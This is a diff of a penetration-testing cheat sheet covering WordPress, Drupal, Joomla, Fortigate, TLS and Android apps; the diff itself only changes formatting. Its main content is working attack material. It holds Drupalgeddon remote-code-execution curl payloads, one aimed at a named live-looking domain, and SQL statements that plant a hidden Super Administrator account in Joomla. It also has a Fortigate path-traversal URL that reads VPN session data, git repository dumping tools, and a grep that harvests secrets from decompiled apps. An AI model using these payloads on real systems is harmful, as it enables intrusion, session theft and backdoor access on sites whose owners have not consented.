@@ -16,17 +16,17 @@ joomscan
 
 ### Wordpress
 
-#### Find version
+Find version
 
 * into xml via website.com/rss
 * Html source code
 * CMSmap or WPScan
 
-#### XMLrpc
+XMLrpc
 
-#### List methods
+List methods
 
-```text
+```bash
 POST /xmlrpc.php HTTP/1.1
 Host: <target>
 Accept-Encoding: gzip, deflate
@@ -44,7 +44,7 @@ Content-Length: 95
 
 if there is pingback, try :
 
-```text
+```bash
 <methodCall>
 <methodName>pingback.ping</methodName>
 <params><param>
@@ -56,7 +56,7 @@ if there is pingback, try :
 
 ### Drupal
 
-```text
+```bash
 drupal , intruder from 0 to 500 on /node/$
 
 /imce
@@ -64,39 +64,39 @@ drupal , intruder from 0 to 500 on /node/$
 Druppalgeddon 2/3
 ```
 
-#### POC1 drupal 8:
+POC1 drupal 8
 
-```text
+```bash
   curl -k -i 'https://filalapat.fr/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
     --data 'form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=uname -a'
 ```
 
-#### POC2 drupal 8:
+POC2 drupal 8
 
-```text
+```bash
 curl -k -i 'https://filalapat.fr/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
     --data 'form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=touch+/tmp/2'
 ```
 
-#### POC3 drupal 7
+POC3 drupal 7
 
-```text
+```bash
  curl -k -s 'http://localhost/drupal-7.55/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]=uname+-a' \
     --data "form_id=user_pass&_triggering_element_name=name" | grep form_build_id
 ```
 
 ### Joomla
 
-#### Joomla 1.5
+Joomla 1.5
 
-```text
+```bash
 user:md5_gen(1)MD5$SALT
 ```
 
 *  [https://www.exploit-db.com/exploits/6234](https://www.exploit-db.com/exploits/6234)
 * [http://www.passwordtool.hu/joomla-password-hash-generator-salt-key](http://www.passwordtool.hu/joomla-password-hash-generator-salt-key)
 
-```text
+```bash
 creer new users INSERT INTO jos_users (name, username, password, usertype, gid, params) VALUES ('toto', 'toto', 'fcba92f4dd6b902f8a66054b8327ae6b:F2sVBzlFOUl51D3HtRZ0tionaJQGQqB', 'Super Administrator', 25, ''); INSERT INTO jos_core_acl_aro VALUES (NULL, 'users', LAST_INSERT_ID(), 0, 'toto', 0); INSERT INTO jos_core_acl_groups_aro_map VALUES (25, '', LAST_INSERT_ID());
 ```
 
@@ -106,9 +106,9 @@ Security Testers: Inject JavaScript and JSON wherever you can and see what happe
 
 ## Angularjs
 
-#### check the bypassSecurityTrustX / innerHTML function
+check the bypassSecurityTrustX / innerHTML function
 
-```text
+```bash
 bypassSecurityTrustHtml
 bypassSecurityTrustScript
 bypassSecurityTrustStyle
@@ -118,13 +118,13 @@ bypassSecurityTrustResourceUrl
 
 ## ckfinder
 
-```text
+```bash
 ckfinder/ckfinder.html
 ```
 
 ## Git
 
-```text
+```bash
 https://github.com/internetwache/GitTools/tree/master/Dumper
 https://github.com/arthaud/git-dumper
 run script post-merge https://docs.gitlab.com/ee/administration/custom_hooks.html  .git/hooks
@@ -140,7 +140,7 @@ Check default password : \(UpdatePasswd=1 if factory password, 0 if the password
 
 ## Fortigate
 
-```text
+```bash
 /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
 ```
 
@@ -150,7 +150,7 @@ Check default password : \(UpdatePasswd=1 if factory password, 0 if the password
 
 ## GPG decode
 
-```text
+```bash
 gpg --decrypt Test.zip.gpg > test.zip ( popup password )
 ```
 
@@ -158,15 +158,15 @@ gpg --decrypt Test.zip.gpg > test.zip ( popup password )
 
 * [testssh.sh](https://github.com/drwetter/testssl.sh)
 
-#### check Heartbleed
+check Heartbleed
 
-```text
+```bash
 cat list.txt | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line: safe; done
 ```
 
-#### Openssl
+Openssl
 
-```text
+```bash
 openssl s_client -cipher BEAST -connect <target>:443
 openssl s_client -connect <target>:443 -ssl3
 
@@ -174,31 +174,31 @@ openssl s_client -connect <target>:443 -ssl3
 openssl s_client -connect <target>:443 | openssl x509 -noout -dates
 ```
 
-#### check lucky13
+check lucky13
 
-```text
+```bash
 openssl s_client -cipher DES-CBC3-SHA -connect xx.fr:443
 ```
 
 ## SSH 
 
-#### check if 4096 key
+check if 4096 key
 
-```text
+```bash
 ssh-keygen -l -f key.pub
 ```
 
 ## `Android`
 
-#### `Apktool`
+`Apktool`
 
-```text
+```bash
 apktool d app_name.apk
 ```
 
-#### Extract sensitive info
+Extract sensitive info
 
-```text
+```bash
 grep -EHirn "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" APKfolder/
 ```
 
